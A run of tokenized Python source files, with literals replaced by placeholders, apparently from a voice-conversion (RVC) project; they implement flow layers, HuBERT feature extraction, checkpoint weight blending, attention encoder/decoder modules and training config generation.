<NUM_LIT> ] ) <EOL> if not reverse : <EOL> logdet = torch . zeros ( x . size ( <NUM_LIT> ) ) . to ( dtype = x . dtype , device = x . device ) <EOL> return x , logdet <EOL> else : <EOL> return x <EOL> class ElementwiseAffine ( nn . Module ) : <EOL> def __init__ ( self , channels ) : <EOL> super ( ) . __init__ ( ) <EOL> self . channels = channels <EOL> self . m = nn . Parameter ( torch . zeros ( channels , <NUM_LIT> ) ) <EOL> self . logs = nn . Parameter ( torch . zeros ( channels , <NUM_LIT> ) ) <EOL> def forward ( self , x , x_mask , reverse = False , ** kwargs ) : <EOL> if not reverse : <EOL> y = self . m + torch . exp ( self . logs ) * x <EOL> y = y * x_mask <EOL> logdet = torch . sum ( self . logs * x_mask , [ <NUM_LIT> , <NUM_LIT> ] ) <EOL> return y , logdet <EOL> else : <EOL> x = ( x - self . m ) * torch . exp ( - self . logs ) * x_mask <EOL> return x <EOL> class ResidualCouplingLayer ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> channels , <EOL> hidden_channels , <EOL> kernel_size , <EOL> dilation_rate , <EOL> n_layers , <EOL> p_dropout = <NUM_LIT> , <EOL> gin_channels = <NUM_LIT> , <EOL> mean_only = False , <EOL> ) : <EOL> assert channels % <NUM_LIT> == <NUM_LIT> , "<STR_LIT>" <EOL> super ( ) . __init__ ( ) <EOL> self . channels = channels <EOL> self . hidden_channels = hidden_channels <EOL> self . kernel_size = kernel_size <EOL> self . dilation_rate = dilation_rate <EOL> self . n_layers = n_layers <EOL> self . half_channels = channels // <NUM_LIT> <EOL> self . mean_only = mean_only <EOL> self . pre = nn . Conv1d ( self . half_channels , hidden_channels , <NUM_LIT> ) <EOL> self . enc = WN ( <EOL> hidden_channels , <EOL> kernel_size , <EOL> dilation_rate , <EOL> n_layers , <EOL> p_dropout = p_dropout , <EOL> gin_channels = gin_channels , <EOL> ) <EOL> self . post = nn . Conv1d ( hidden_channels , self . half_channels * ( <NUM_LIT> - mean_only ) , <NUM_LIT> ) <EOL> self . post . weight . data . zero_ ( ) <EOL> self . post . bias . data . zero_ ( ) <EOL> def forward ( self , x , x_mask , g = None , reverse = False ) : <EOL> x0 , x1 = torch . split ( x , [ self . half_channels ] * <NUM_LIT> , <NUM_LIT> ) <EOL> h = self . pre ( x0 ) * x_mask <EOL> h = self . enc ( h , x_mask , g = g ) <EOL> stats = self . post ( h ) * x_mask <EOL> if not self . mean_only : <EOL> m , logs = torch . split ( stats , [ self . half_channels ] * <NUM_LIT> , <NUM_LIT> ) <EOL> else : <EOL> m = stats <EOL> logs = torch . zeros_like ( m ) <EOL> if not reverse : <EOL> x1 = m + x1 * torch . exp ( logs ) * x_mask <EOL> x = torch . cat ( [ x0 , x1 ] , <NUM_LIT> ) <EOL> logdet = torch . sum ( logs , [ <NUM_LIT> , <NUM_LIT> ] ) <EOL> return x , logdet <EOL> else : <EOL> x1 = ( x1 - m ) * torch . exp ( - logs ) * x_mask <EOL> x = torch . cat ( [ x0 , x1 ] , <NUM_LIT> ) <EOL> return x <EOL> def remove_weight_norm ( self ) : <EOL> self . enc . remove_weight_norm ( ) <EOL> class ConvFlow ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> in_channels , <EOL> filter_channels , <EOL> kernel_size , <EOL> n_layers , <EOL> num_bins = <NUM_LIT> , <EOL> tail_bound = <NUM_LIT> , <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> self . in_channels = in_channels <EOL> self . filter_channels = filter_channels <EOL> self . kernel_size = kernel_size <EOL> self . n_layers = n_layers <EOL> self . num_bins = num_bins <EOL> self . tail_bound = tail_bound <EOL> self . half_channels = in_channels // <NUM_LIT> <EOL> self . pre = nn . Conv1d ( self . half_channels , filter_channels , <NUM_LIT> ) <EOL> self . convs = DDSConv ( filter_channels , kernel_size , n_layers , p_dropout = <NUM_LIT> ) <EOL> self . proj = nn . Conv1d ( <EOL> filter_channels , self . half_channels * ( num_bins * <NUM_LIT> - <NUM_LIT> ) , <NUM_LIT> <EOL> ) <EOL> self . proj . weight . data . zero_ ( ) <EOL> self . proj . bias . data . zero_ ( ) <EOL> def forward ( self , x , x_mask , g = None , reverse = False ) : <EOL> x0 , x1 = torch . split ( x , [ self . half_channels ] * <NUM_LIT> , <NUM_LIT> ) <EOL> h = self . pre ( x0 ) <EOL> h = self . convs ( h , x_mask , g = g ) <EOL> h = self . proj ( h ) * x_mask <EOL> b , c , t = x0 . shape <EOL> h = h . reshape ( b , c , - <NUM_LIT> , t ) . permute ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) <EOL> unnormalized_widths = h [ ... , : self . num_bins ] / math . sqrt ( self . filter_channels ) <EOL> unnormalized_heights = h [ ... , self . num_bins : <NUM_LIT> * self . num_bins ] / math . sqrt ( <EOL> self . filter_channels <EOL> ) <EOL> unnormalized_derivatives = h [ ... , <NUM_LIT> * self . num_bins : ] <EOL> x1 , logabsdet = piecewise_rational_quadratic_transform ( <EOL> x1 , <EOL> unnormalized_widths , <EOL> unnormalized_heights , <EOL> unnormalized_derivatives , <EOL> inverse = reverse , <EOL> tails = "<STR_LIT>" , <EOL> tail_bound = self . tail_bound , <EOL> ) <EOL> x = torch . cat ( [ x0 , x1 ] , <NUM_LIT> ) * x_mask <EOL> logdet = torch . sum ( logabsdet * x_mask , [ <NUM_LIT> , <NUM_LIT> ] ) <EOL> if not reverse : <EOL> return x , logdet <EOL> else : <EOL> return x <EOL> </s>
<s> import os <EOL> import sys <EOL> import tqdm <EOL> import torch <EOL> import torch . nn . functional as F <EOL> import fairseq <EOL> import soundfile as sf <EOL> import numpy as np <EOL> import logging <EOL> logging . getLogger ( "<STR_LIT>" ) . setLevel ( logging . WARNING ) <EOL> device = sys . argv [ <NUM_LIT> ] <EOL> n_parts = int ( sys . argv [ <NUM_LIT> ] ) <EOL> i_part = int ( sys . argv [ <NUM_LIT> ] ) <EOL> if len ( sys . argv ) == <NUM_LIT> : <EOL> exp_dir , version , is_half = sys . argv [ <NUM_LIT> ] , sys . argv [ <NUM_LIT> ] , bool ( sys . argv [ <NUM_LIT> ] ) <EOL> else : <EOL> i_gpu , exp_dir = sys . argv [ <NUM_LIT> ] , sys . argv [ <NUM_LIT> ] <EOL> os . environ [ "<STR_LIT>" ] = str ( i_gpu ) <EOL> version , is_half = sys . argv [ <NUM_LIT> ] , bool ( sys . argv [ <NUM_LIT> ] ) <EOL> def forward_dml ( ctx , x , scale ) : <EOL> ctx . scale = scale <EOL> res = x . clone ( ) . detach ( ) <EOL> return res <EOL> fairseq . modules . grad_multiply . GradMultiply . forward = forward_dml <EOL> model_path = "<STR_LIT>" <EOL> wav_path = f"<STR_LIT>" <EOL> out_path = f"<STR_LIT>" if version == "<STR_LIT>" else f"<STR_LIT>" <EOL> os . makedirs ( out_path , exist_ok = True ) <EOL> def read_wave ( wav_path , normalize = False ) : <EOL> wav , sr = sf . read ( wav_path ) <EOL> assert sr == <NUM_LIT> <EOL> feats = torch . from_numpy ( wav ) <EOL> feats = feats . half ( ) if is_half else feats . float ( ) <EOL> feats = feats . mean ( - <NUM_LIT> ) if feats . dim ( ) == <NUM_LIT> else feats <EOL> feats = feats . view ( <NUM_LIT> , - <NUM_LIT> ) <EOL> if normalize : <EOL> with torch . no_grad ( ) : <EOL> feats = F . layer_norm ( feats , feats . shape ) <EOL> return feats <EOL> print ( "<STR_LIT>" ) <EOL> models , saved_cfg , task = fairseq . checkpoint_utils . load_model_ensemble_and_task ( <EOL> [ model_path ] , <EOL> suffix = "<STR_LIT>" , <EOL> ) <EOL> model = models [ <NUM_LIT> ] <EOL> model = model . to ( device ) <EOL> if device not in [ "<STR_LIT>" , "<STR_LIT>" ] : <EOL> model = model . half ( ) <EOL> model . eval ( ) <EOL> todo = sorted ( os . listdir ( wav_path ) ) [ i_part : : n_parts ] <EOL> n = max ( <NUM_LIT> , len ( todo ) // <NUM_LIT> ) <EOL> if len ( todo ) == <NUM_LIT> : <EOL> print ( <EOL> "<STR_LIT>" <EOL> ) <EOL> else : <EOL> print ( f"<STR_LIT>" ) <EOL> with tqdm . tqdm ( total = len ( todo ) ) as pbar : <EOL> for idx , file in enumerate ( todo ) : <EOL> try : <EOL> if file . endswith ( "<STR_LIT>" ) : <EOL> wav_file_path = os . path . join ( wav_path , file ) <EOL> out_file_path = os . path . join ( out_path , file . replace ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> if os . path . exists ( out_file_path ) : <EOL> continue <EOL> feats = read_wave ( wav_file_path , normalize = saved_cfg . task . normalize ) <EOL> padding_mask = torch . BoolTensor ( feats . shape ) . fill_ ( False ) <EOL> inputs = { <EOL> "<STR_LIT>" : feats . to ( device ) , <EOL> "<STR_LIT>" : padding_mask . to ( device ) , <EOL> "<STR_LIT>" : <NUM_LIT> if version == "<STR_LIT>" else <NUM_LIT> , <EOL> } <EOL> with torch . no_grad ( ) : <EOL> logits = model . extract_features ( ** inputs ) <EOL> feats = ( <EOL> model . final_proj ( logits [ <NUM_LIT> ] ) <EOL> if version == "<STR_LIT>" <EOL> else logits [ <NUM_LIT> ] <EOL> ) <EOL> feats = feats . squeeze ( <NUM_LIT> ) . float ( ) . cpu ( ) . numpy ( ) <EOL> if np . isnan ( feats ) . sum ( ) == <NUM_LIT> : <EOL> np . save ( out_file_path , feats , allow_pickle = False ) <EOL> else : <EOL> print ( f"<STR_LIT>" ) <EOL> pbar . set_description ( f"<STR_LIT>" ) <EOL> except Exception as error : <EOL> print ( error ) <EOL> pbar . update ( <NUM_LIT> ) <EOL> print ( "<STR_LIT>" ) <EOL> </s>
<s> import os <EOL> import torch <EOL> from collections import OrderedDict <EOL> def extract ( ckpt ) : <EOL> a = ckpt [ "<STR_LIT>" ] <EOL> opt = OrderedDict ( ) <EOL> opt [ "<STR_LIT>" ] = { } <EOL> for key in a . keys ( ) : <EOL> if "<STR_LIT>" in key : <EOL> continue <EOL> opt [ "<STR_LIT>" ] [ key ] = a [ key ] <EOL> return opt <EOL> def model_blender ( name , path1 , path2 , ratio ) : <EOL> try : <EOL> message = f"<STR_LIT>" <EOL> ckpt1 = torch . load ( path1 , map_location = "<STR_LIT>" ) <EOL> ckpt2 = torch . load ( path2 , map_location = "<STR_LIT>" ) <EOL> cfg = ckpt1 [ "<STR_LIT>" ] <EOL> cfg_f0 = ckpt1 [ "<STR_LIT>" ] <EOL> cfg_version = ckpt1 [ "<STR_LIT>" ] <EOL> if "<STR_LIT>" in ckpt1 : <EOL> ckpt1 = extract ( ckpt1 ) <EOL> else : <EOL> ckpt1 = ckpt1 [ "<STR_LIT>" ] <EOL> if "<STR_LIT>" in ckpt2 : <EOL> ckpt2 = extract ( ckpt2 ) <EOL> else : <EOL> ckpt2 = ckpt2 [ "<STR_LIT>" ] <EOL> if sorted ( list ( ckpt1 . keys ( ) ) ) != sorted ( list ( ckpt2 . keys ( ) ) ) : <EOL> return "<STR_LIT>" <EOL> opt = OrderedDict ( ) <EOL> opt [ "<STR_LIT>" ] = { } <EOL> for key in ckpt1 . keys ( ) : <EOL> if key == "<STR_LIT>" and ckpt1 [ key ] . shape != ckpt2 [ key ] . shape : <EOL> min_shape0 = min ( ckpt1 [ key ] . shape [ <NUM_LIT> ] , ckpt2 [ key ] . shape [ <NUM_LIT> ] ) <EOL> opt [ "<STR_LIT>" ] [ key ] = ( <EOL> ratio * ( ckpt1 [ key ] [ : min_shape0 ] . float ( ) ) <EOL> + ( <NUM_LIT> - ratio ) * ( ckpt2 [ key ] [ : min_shape0 ] . float ( ) ) <EOL> ) . half ( ) <EOL> else : <EOL> opt [ "<STR_LIT>" ] [ key ] = ( <EOL> ratio * ( ckpt1 [ key ] . float ( ) ) + ( <NUM_LIT> - ratio ) * ( ckpt2 [ key ] . float ( ) ) <EOL> ) . half ( ) <EOL> opt [ "<STR_LIT>" ] = cfg <EOL> opt [ "<STR_LIT>" ] = message <EOL> opt [ "<STR_LIT>" ] = cfg_f0 <EOL> opt [ "<STR_LIT>" ] = cfg_version <EOL> opt [ "<STR_LIT>" ] = message <EOL> torch . save ( opt , os . path . join ( "<STR_LIT>" , "<STR_LIT>" % name ) ) <EOL> print ( message ) <EOL> return message , os . path . join ( "<STR_LIT>" , "<STR_LIT>" % name ) <EOL> except Exception as error : <EOL> print ( error ) <EOL> return error <EOL> </s>
<s> import math <EOL> import torch <EOL> from torch import nn <EOL> from torch . nn import functional as F <EOL> from . import commons <EOL> from . modules import LayerNorm <EOL> class Encoder ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> hidden_channels , <EOL> filter_channels , <EOL> n_heads , <EOL> n_layers , <EOL> kernel_size = <NUM_LIT> , <EOL> p_dropout = <NUM_LIT> , <EOL> window_size = <NUM_LIT> , <EOL> ** kwargs <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> self . hidden_channels = hidden_channels <EOL> self . filter_channels = filter_channels <EOL> self . n_heads = n_heads <EOL> self . n_layers = n_layers <EOL> self . kernel_size = kernel_size <EOL> self . p_dropout = p_dropout <EOL> self . window_size = window_size <EOL> self . drop = nn . Dropout ( p_dropout ) <EOL> self . attn_layers = nn . ModuleList ( ) <EOL> self . norm_layers_1 = nn . ModuleList ( ) <EOL> self . ffn_layers = nn . ModuleList ( ) <EOL> self . norm_layers_2 = nn . ModuleList ( ) <EOL> for i in range ( self . n_layers ) : <EOL> self . attn_layers . append ( <EOL> MultiHeadAttention ( <EOL> hidden_channels , <EOL> hidden_channels , <EOL> n_heads , <EOL> p_dropout = p_dropout , <EOL> window_size = window_size , <EOL> ) <EOL> ) <EOL> self . norm_layers_1 . append ( LayerNorm ( hidden_channels ) ) <EOL> self . ffn_layers . append ( <EOL> FFN ( <EOL> hidden_channels , <EOL> hidden_channels , <EOL> filter_channels , <EOL> kernel_size , <EOL> p_dropout = p_dropout , <EOL> ) <EOL> ) <EOL> self . norm_layers_2 . append ( LayerNorm ( hidden_channels ) ) <EOL> def forward ( self , x , x_mask ) : <EOL> attn_mask = x_mask . unsqueeze ( <NUM_LIT> ) * x_mask . unsqueeze ( - <NUM_LIT> ) <EOL> x = x * x_mask <EOL> for i in range ( self . n_layers ) : <EOL> y = self . attn_layers [ i ] ( x , x , attn_mask ) <EOL> y = self . drop ( y ) <EOL> x = self . norm_layers_1 [ i ] ( x + y ) <EOL> y = self . ffn_layers [ i ] ( x , x_mask ) <EOL> y = self . drop ( y ) <EOL> x = self . norm_layers_2 [ i ] ( x + y ) <EOL> x = x * x_mask <EOL> return x <EOL> class Decoder ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> hidden_channels , <EOL> filter_channels , <EOL> n_heads , <EOL> n_layers , <EOL> kernel_size = <NUM_LIT> , <EOL> p_dropout = <NUM_LIT> , <EOL> proximal_bias = False , <EOL> proximal_init = True , <EOL> ** kwargs <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> self . hidden_channels = hidden_channels <EOL> self . filter_channels = filter_channels <EOL> self . n_heads = n_heads <EOL> self . n_layers = n_layers <EOL> self . kernel_size = kernel_size <EOL> self . p_dropout = p_dropout <EOL> self . proximal_bias = proximal_bias <EOL> self . proximal_init = proximal_init <EOL> self . drop = nn . Dropout ( p_dropout ) <EOL> self . self_attn_layers = nn . ModuleList ( ) <EOL> self . norm_layers_0 = nn . ModuleList ( ) <EOL> self . encdec_attn_layers = nn . ModuleList ( ) <EOL> self . norm_layers_1 = nn . ModuleList ( ) <EOL> self . ffn_layers = nn . ModuleList ( ) <EOL> self . norm_layers_2 = nn . ModuleList ( ) <EOL> for i in range ( self . n_layers ) : <EOL> self . self_attn_layers . append ( <EOL> MultiHeadAttention ( <EOL> hidden_channels , <EOL> hidden_channels , <EOL> n_heads , <EOL> p_dropout = p_dropout , <EOL> proximal_bias = proximal_bias , <EOL> proximal_init = proximal_init , <EOL> ) <EOL> ) <EOL> self . norm_layers_0 . append ( LayerNorm ( hidden_channels ) ) <EOL> self . encdec_attn_layers . append ( <EOL> MultiHeadAttention ( <EOL> hidden_channels , hidden_channels , n_heads , p_dropout = p_dropout <EOL> ) <EOL> ) <EOL> self . norm_layers_1 . append ( LayerNorm ( hidden_channels ) ) <EOL> self . ffn_layers . append ( <EOL> FFN ( <EOL> hidden_channels , <EOL> hidden_channels , <EOL> filter_channels , <EOL> kernel_size , <EOL> p_dropout = p_dropout , <EOL> causal = True , <EOL> ) <EOL> ) <EOL> self . norm_layers_2 . append ( LayerNorm ( hidden_channels ) ) <EOL> def forward ( self , x , x_mask , h , h_mask ) : <EOL> self_attn_mask = commons . subsequent_mask ( x_mask . size ( <NUM_LIT> ) ) . to ( <EOL> device = x . device , dtype = x . dtype <EOL> ) <EOL> encdec_attn_mask = h_mask . unsqueeze ( <NUM_LIT> ) * x_mask . unsqueeze ( - <NUM_LIT> ) <EOL> x = x * x_mask <EOL> for i in range ( self . n_layers ) : <EOL> y = self . self_attn_layers [ i ] ( x , x , self_attn_mask ) <EOL> y = self . drop ( y ) <EOL> x = self . norm_layers_0 [ i ] ( x + y ) <EOL> y = self . encdec_attn_layers [ i ] ( x , h , encdec_attn_mask ) <EOL> y = self . drop ( y ) <EOL> x = self . norm_layers_1 [ i ] ( x + y ) <EOL> y = self . ffn_layers [ i ] ( x , x_mask ) <EOL> y = self . drop ( y ) <EOL> x = self . norm_layers_2 [ i ] ( x + y ) <EOL> x = x * x_mask <EOL> return x <EOL> class MultiHeadAttention ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> channels , <EOL> out_channels , <EOL> n_heads , <EOL> p_dropout = <NUM_LIT> , <EOL> window_size = None , <EOL> heads_share = True , <EOL> block_length = None , <EOL> proximal_bias = False , <EOL> proximal_init = False , <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> assert channels % n_heads == <NUM_LIT> <EOL> self . channels = channels <EOL> self . out_channels = out_channels <EOL> self . n_heads = n_heads <EOL> self . p_dropout = p_dropout <EOL> self . window_size = window_size <EOL> self . heads_share = heads_share <EOL> self . block_length = block_length <EOL> self . proximal_bias = proximal_bias <EOL> self . proximal_init = proximal_init <EOL> self . attn = None <EOL> self . k_channels = channels // n_heads <EOL> self . conv_q = nn . Conv1d ( channels , channels , <NUM_LIT> ) <EOL> self . conv_k = nn . Conv1d ( channels , channels , <NUM_LIT> ) <EOL> self . conv_v = nn . Conv1d ( channels , channels , <NUM_LIT> ) <EOL> self . conv_o = nn . Conv1d ( channels , out_channels , <NUM_LIT> ) <EOL> self . drop = nn . Dropout ( p_dropout ) <EOL> if window_size is not None : <EOL> n_heads_rel = <NUM_LIT> if heads_share else n_heads <EOL> rel_stddev = self . k_channels ** - <NUM_LIT> <EOL> self . emb_rel_k = nn . Parameter ( <EOL> torch . randn ( n_heads_rel , window_size * <NUM_LIT> + <NUM_LIT> , self . k_channels ) <EOL> * rel_stddev <EOL> ) <EOL> self . emb_rel_v = nn . Parameter ( <EOL> torch . randn ( n_heads_rel , window_size * <NUM_LIT> + <NUM_LIT> , self . k_channels ) <EOL> * rel_stddev <EOL> ) <EOL> nn . init . xavier_uniform_ ( self . conv_q . weight ) <EOL> nn . init . xavier_uniform_ ( self . conv_k . weight ) <EOL> nn . init . xavier_uniform_ ( self . conv_v . weight ) <EOL> if proximal_init : <EOL> with torch . no_grad ( ) : <EOL> self . conv_k . weight . copy_ ( self . conv_q . weight ) <EOL> self . conv_k . bias . copy_ ( self . conv_q . bias ) <EOL> def forward ( self , x , c , attn_mask = None ) : <EOL> q = self . conv_q ( x ) <EOL> k = self . conv_k ( c ) <EOL> v = self . conv_v ( c ) <EOL> x , self . attn = self . attention ( q , k , v , mask = attn_mask ) <EOL> x = self . conv_o ( x ) <EOL> return x <EOL> def attention ( self , query , key , value , mask = None ) : <EOL> b , d , t_s , t_t = ( * key . size ( ) , query . size ( <NUM_LIT> ) ) <EOL> query = query . view ( b , self . n_heads , self . k_channels , t_t ) . transpose ( <NUM_LIT> , <NUM_LIT> ) <EOL> key = key . view ( b , self . n_heads , self . k_channels , t_s ) . transpose ( <NUM_LIT> , <NUM_LIT> ) <EOL> value = value . view ( b , self . n_heads , self . k_channels , t_s ) . transpose ( <NUM_LIT> , <NUM_LIT> ) <EOL> scores = torch . matmul ( query / math . sqrt ( self . k_channels ) , key . transpose ( - <NUM_LIT> , - <NUM_LIT> ) ) <EOL> if self . window_size is not None : <EOL> assert ( <EOL> t_s == t_t <EOL> ) , "<STR_LIT>" <EOL> key_relative_embeddings = self . _get_relative_embeddings ( self . emb_rel_k , t_s ) <EOL> rel_logits = self . _matmul_with_relative_keys ( <EOL> query / math . sqrt ( self . k_channels ) , key_relative_embeddings <EOL> ) <EOL> scores_local = self . _relative_position_to_absolute_position ( rel_logits ) <EOL> scores = scores + scores_local <EOL> if self . proximal_bias : <EOL> assert t_s == t_t , "<STR_LIT>" <EOL> scores = scores + self . _attention_bias_proximal ( t_s ) . to ( <EOL> device = scores . device , dtype = scores . dtype <EOL> ) <EOL> if mask is not None : <EOL> scores = scores . masked_fill ( mask == <NUM_LIT> , - <NUM_LIT> ) <EOL> if self . block_length is not None : <EOL> assert ( <EOL> t_s == t_t <EOL> ) , "<STR_LIT>" <EOL> block_mask = ( <EOL> torch . ones_like ( scores ) <EOL> . triu ( - self . block_length ) <EOL> . tril ( self . block_length ) <EOL> ) <EOL> scores = scores . masked_fill ( block_mask == <NUM_LIT> , - <NUM_LIT> ) <EOL> p_attn = F . softmax ( scores , dim = - <NUM_LIT> ) <EOL> p_attn = self . drop ( p_attn ) <EOL> output = torch . matmul ( p_attn , value ) <EOL> if self . window_size is not None : <EOL> relative_weights = self . _absolute_position_to_relative_position ( p_attn ) <EOL> value_relative_embeddings = self . _get_relative_embeddings ( <EOL> self . emb_rel_v , t_s <EOL> ) <EOL> output = output + self . _matmul_with_relative_values ( <EOL> relative_weights , value_relative_embeddings <EOL> ) <EOL> output = output . transpose ( <NUM_LIT> , <NUM_LIT> ) . contiguous ( ) . view ( b , d , t_t ) <EOL> return output , p_attn <EOL> def _matmul_with_relative_values ( self , x , y ) : <EOL> ret = torch . matmul ( x , y . unsqueeze ( <NUM_LIT> ) ) <EOL> return ret <EOL> def _matmul_with_relative_keys ( self , x , y ) : <EOL> ret = torch . matmul ( x , y . unsqueeze ( <NUM_LIT> ) . transpose ( - <NUM_LIT> , - <NUM_LIT> ) ) <EOL> return ret <EOL> def _get_relative_embeddings ( self , relative_embeddings , length ) : <EOL> pad_length = max ( length - ( self . window_size + <NUM_LIT> ) , <NUM_LIT> ) <EOL> slice_start_position = max ( ( self . window_size + <NUM_LIT> ) - length , <NUM_LIT> ) <EOL> slice_end_position = slice_start_position + <NUM_LIT> * length - <NUM_LIT> <EOL> if pad_length > <NUM_LIT> : <EOL> padded_relative_embeddings = F . pad ( <EOL> relative_embeddings , <EOL> commons . convert_pad_shape ( [ [ <NUM_LIT> , <NUM_LIT> ] , [ pad_length , pad_length ] , [ <NUM_LIT> , <NUM_LIT> ] ] ) , <EOL> ) <EOL> else : <EOL> padded_relative_embeddings = relative_embeddings <EOL> used_relative_embeddings = padded_relative_embeddings [ <EOL> : , slice_start_position : slice_end_position <EOL> ] <EOL> return used_relative_embeddings <EOL> def _relative_position_to_absolute_position ( self , x ) : <EOL> batch , heads , length , _ = x . size ( ) <EOL> x = F . pad ( x , commons . convert_pad_shape ( [ [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] ] ) ) <EOL> x_flat = x . view ( [ batch , heads , length * <NUM_LIT> * length ] ) <EOL> x_flat = F . pad ( <EOL> x_flat , commons . convert_pad_shape ( [ [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , length - <NUM_LIT> ] ] ) <EOL> ) <EOL> x_final = x_flat . view ( [ batch , heads , length + <NUM_LIT> , <NUM_LIT> * length - <NUM_LIT> ] ) [ <EOL> : , : , : length , length - <NUM_LIT> : <EOL> ] <EOL> return x_final <EOL> def _absolute_position_to_relative_position ( self , x ) : <EOL> batch , heads , length , _ = x . size ( ) <EOL> x = F . pad ( <EOL> x , commons . convert_pad_shape ( [ [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , length - <NUM_LIT> ] ] ) <EOL> ) <EOL> x_flat = x . view ( [ batch , heads , length ** <NUM_LIT> + length * ( length - <NUM_LIT> ) ] ) <EOL> x_flat = F . pad ( x_flat , commons . convert_pad_shape ( [ [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] , [ length , <NUM_LIT> ] ] ) ) <EOL> x_final = x_flat . view ( [ batch , heads , length , <NUM_LIT> * length ] ) [ : , : , : , <NUM_LIT> : ] <EOL> return x_final <EOL> def _attention_bias_proximal ( self , length ) : <EOL> r = torch . arange ( length , dtype = torch . float32 ) <EOL> diff = torch . unsqueeze ( r , <NUM_LIT> ) - torch . unsqueeze ( r , <NUM_LIT> ) <EOL> return torch . unsqueeze ( torch . unsqueeze ( - torch . log1p ( torch . abs ( diff ) ) , <NUM_LIT> ) , <NUM_LIT> ) <EOL> class FFN ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> in_channels , <EOL> out_channels , <EOL> filter_channels , <EOL> kernel_size , <EOL> p_dropout = <NUM_LIT> , <EOL> activation = None , <EOL> causal = False , <EOL> ) : <EOL> super ( ) . __init__ ( ) <EOL> self . in_channels = in_channels <EOL> self . out_channels = out_channels <EOL> self . filter_channels = filter_channels <EOL> self . kernel_size = kernel_size <EOL> self . p_dropout = p_dropout <EOL> self . activation = activation <EOL> self . causal = causal <EOL> if causal : <EOL> self . padding = self . _causal_padding <EOL> else : <EOL> self . padding = self . _same_padding <EOL> self . conv_1 = nn . Conv1d ( in_channels , filter_channels , kernel_size ) <EOL> self . conv_2 = nn . Conv1d ( filter_channels , out_channels , kernel_size ) <EOL> self . drop = nn . Dropout ( p_dropout ) <EOL> def forward ( self , x , x_mask ) : <EOL> x = self . conv_1 ( self . padding ( x * x_mask ) ) <EOL> if self . activation == "<STR_LIT>" : <EOL> x = x * torch . sigmoid ( <NUM_LIT> * x ) <EOL> else : <EOL> x = torch . relu ( x ) <EOL> x = self . drop ( x ) <EOL> x = self . conv_2 ( self . padding ( x * x_mask ) ) <EOL> return x * x_mask <EOL> def _causal_padding ( self , x ) : <EOL> if self . kernel_size == <NUM_LIT> : <EOL> return x <EOL> pad_l = self . kernel_size - <NUM_LIT> <EOL> pad_r = <NUM_LIT> <EOL> padding = [ [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] , [ pad_l , pad_r ] ] <EOL> x = F . pad ( x , commons . convert_pad_shape ( padding ) ) <EOL> return x <EOL> def _same_padding ( self , x ) : <EOL> if self . kernel_size == <NUM_LIT> : <EOL> return x <EOL> pad_l = ( self . kernel_size - <NUM_LIT> ) // <NUM_LIT> <EOL> pad_r = self . kernel_size // <NUM_LIT> <EOL> padding = [ [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] , [ pad_l , pad_r ] ] <EOL> x = F . pad ( x , commons . convert_pad_shape ( padding ) ) <EOL> return x <EOL> </s>
<s> import os <EOL> import json <EOL> import pathlib <EOL> from random import shuffle <EOL> from rvc . configs . config import Config <EOL> config = Config ( ) <EOL> current_directory = os . getcwd ( ) <EOL> def generate_config ( rvc_version , sampling_rate , model_path ) : <EOL> if rvc_version == "<STR_LIT>" or sampling_rate == "<STR_LIT>" : <EOL> config_path = f"<STR_LIT>" <EOL> else : <EOL> config_path = f"<STR_LIT>" <EOL> config_save_path = os . path . join ( model_path , "<STR_LIT>" ) <EOL> if not pathlib . Path ( config_save_path ) . exists ( ) : <EOL> with open ( config_save_path , "<STR_LIT>" , encoding = "<STR_LIT>" ) as f : <EOL> json . dump ( <EOL> config . json_config [ config_path ] , <EOL> f , <EOL> ensure_ascii = False , <EOL> indent = <NUM_LIT> , <EOL> sort_keys = True , <EOL> ) <EOL> f . write ( "<STR_LIT>" ) <EOL> def generate_filelist ( f0_method , model_path , rvc_version , sampling_rate ) : <EOL> gt_wavs_dir = f"<STR_LIT>" <EOL> feature_dir = ( <EOL> f"<STR_LIT>" <EOL> if rvc_version == "<STR_LIT>" <EOL> else f"<STR_LIT>" <EOL> ) <EOL> if f0_method : <EOL> f0_dir = f"<STR_LIT>" <EOL> f0nsf_dir = f"<STR_LIT>" <EOL> names = ( <EOL> set ( [ name . split ( "<STR_LIT>" ) [ <NUM_LIT> ] for name in os . listdir ( gt_wavs_dir ) ] ) <EOL> & set ( [ name . split ( "<STR_LIT>" ) [ <NUM_LIT> ] for name in os . listdir ( feature_dir ) ] ) <EOL> & set ( [ name . split ( "<STR_LIT>" ) [ <NUM_LIT> ] for name in os . listdir ( f0_dir ) ] ) <EOL> & set ( [ name . split ( "<STR_LIT>" ) [ <NUM_LIT> ] for name in os . listdir ( f0nsf_dir ) ] ) <EOL> ) <EOL> else : <EOL> names = set ( [ name . split ( "<STR_LIT>" ) [ <NUM_LIT> ] for name in os . listdir ( gt_wavs_dir ) ] ) & set ( <EOL> [ name . split ( "<STR_LIT>" ) [ <NUM_LIT> ] for name in os . listdir ( feature_dir ) ] <EOL> ) <EOL> options = [ ] <EOL> for name in names : <EOL> if f0_method : <EOL> options . append ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> else : <EOL> options . append ( f"<STR_LIT>" ) <EOL> fea_dim = <NUM_LIT> if rvc_version == "<STR_LIT>" else <NUM_LIT> <EOL> if f0_method : 